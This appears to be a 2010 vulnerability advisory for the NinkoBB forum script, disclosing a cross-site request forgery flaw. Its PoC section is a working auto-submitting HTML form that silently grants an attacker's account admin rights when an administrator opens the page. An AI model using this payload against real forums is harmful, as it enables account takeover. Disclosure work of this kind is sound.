@@ -1,0 +1,45 @@
+# Title: NinkoBB CSRF Vulnerability
+# Author: ADEO Security
+# Published: 30/06/2010
+# Version: 1.3RC5 (Possible all versions)
+# Vendor: http://ninkobb.com
+# Download: http://ninkobb.com/releases/?NinkoBB-1.3RC5.zip
+
+# Description: "NinkoBB is an open source forum script written in the
+PHP language and uses a MySQL Database.
+NinkoBB is designed to be as simple as possible and provide you with
+the key features that you need, all the while keeping the space used
+on your server to a minimum.
+Built to be simple, small, and easy to use with a user friendly
+install for a quick setup, painless upgrade system, and easy to use
+admin panel for managing your forum. Also includes support for
+categories, plugins, languages, and themes."
+
+# Credit: Vulnerability founded by Canberk BOLAT at ADEO Security Labs
+        - Mail: security[AT]adeo.com.tr
+        - Web: http://security.adeo.com.tr
+
+# Vulnerability:
+If administrator of the board browse PoC attacker can gain privilege
+access. See #PoC section.
+
+# PoC:
+<html>
+<body>
+<form method="post" action="http://ninkobb.test/admin.php?a=users&edit=1">
+<input type="hidden" name="username" value="attackers_uname">
+<input type="hidden" name="admin" value="true">
+<input type="hidden" name="email" value="attackers_mail@mail.com">
+<input type="hidden" name="npassword" value="adeopass">
+<input type="hidden" name="npassworda" value="adeopass">
+<input type="hidden" name="edit" value="submit">
+</form>
+<script>document.forms[0].submit()</script>
+</body>
+</html>
+
+
+-- 
+Canberk BOLAT
+i'm currently intern @ ADEO Security
+http://twitter.com/cnbrkbolat
